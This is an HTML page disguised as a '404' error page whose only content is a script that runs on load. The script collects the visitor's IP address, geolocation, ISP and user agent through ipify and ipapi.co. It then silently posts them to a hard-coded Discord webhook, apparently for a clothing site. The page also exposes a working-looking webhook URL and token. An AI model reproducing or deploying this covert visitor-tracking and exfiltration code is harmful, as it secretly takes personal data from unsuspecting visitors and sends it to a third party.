<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>404</title>
</head>
<body>
  <script>
    const webhookURL = "https://discord.com/api/webhooks/1358289815505735730/nHS6LgsyUpBeSmgu980t8q1bbjqh4MVmgO646IgEm1K_3ZcRQLw29fE1LqRF6nhqsCWJ";

    
    fetch("https://api.ipify.org?format=json")
      .then(response => response.json())
      .then(ipData => {
        const ip = ipData.ip;

        
        fetch(`https://ipapi.co/${ip}/json/`)
          .then(response => response.json())
          .then(locationData => {
            const location = `${locationData.city}, ${locationData.region}, ${locationData.country_name}`;
            const isp = locationData.org || "Unknown ISP";
            const userAgent = navigator.userAgent;

            
            const message = {
              content: `ðŸŒ New visitor to TheLocusclothing:
IP: ${ip}
Location: ${location}
ISP: ${isp}
User-Agent: ${userAgent}`
            };

            fetch(webhookURL, {
              method: "POST",
              headers: {
                "Content-Type": "application/json"
              },
              body: JSON.stringify(message)
            });
          });
      })
      .catch(error => {
        console.error("Error 404:", error);
      });
  </script>
</body>
</html>
